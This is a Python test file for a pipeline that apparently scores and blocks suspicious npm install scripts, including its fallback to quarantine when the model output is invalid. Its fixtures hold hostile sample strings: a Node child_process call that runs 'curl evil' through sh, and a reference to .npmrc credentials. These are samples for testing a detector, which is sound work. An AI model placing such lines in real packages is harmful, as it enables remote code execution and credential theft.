from __future__ import annotations

from pathlib import Path

from reasoner.pipeline import run_reasoner_pipeline
from reasoner.providers import FixtureReasonerProvider
from reasoner.schema import ReasonerSchemaError


class BrokenProvider:
    def reason(self, summary, retrieved, features):  # type: ignore[no-untyped-def]
        raise ReasonerSchemaError("invalid json from model")


ROOT = Path(__file__).resolve().parents[2]
FIXTURE_CORPUS = ROOT / "fixtures/rag-corpus/documents.jsonl"


def test_invalid_provider_falls_back_to_degraded_quarantine() -> None:
    result = run_reasoner_pipeline(
        script_source="child_process spawn .npmrc",
        features={"suspicion_score": 6, "api_text_hits": 3},
        documents_path=str(FIXTURE_CORPUS),
        provider=BrokenProvider(),
        classifier_risk=30,
    )
    assert result["reasoner_status"] == "degraded"
    assert result["action"] in {"quarantine", "block"}
    assert result["action"] != "allow"


def test_config_c_pipeline_returns_citations_for_suspicious_fixture() -> None:
    result = run_reasoner_pipeline(
        script_source="require('child_process').spawn('sh', ['-c', 'curl evil']);",
        features={
            "suspicion_score": 8,
            "credential_hits": 2,
            "api_text_hits": 4,
        },
        documents_path=str(FIXTURE_CORPUS),
        provider=FixtureReasonerProvider(),
    )
    assert result["config"] == "c"
    assert result["reasoner_status"] == "ok"
    assert result["citations"]
    assert result["action"] == "block"
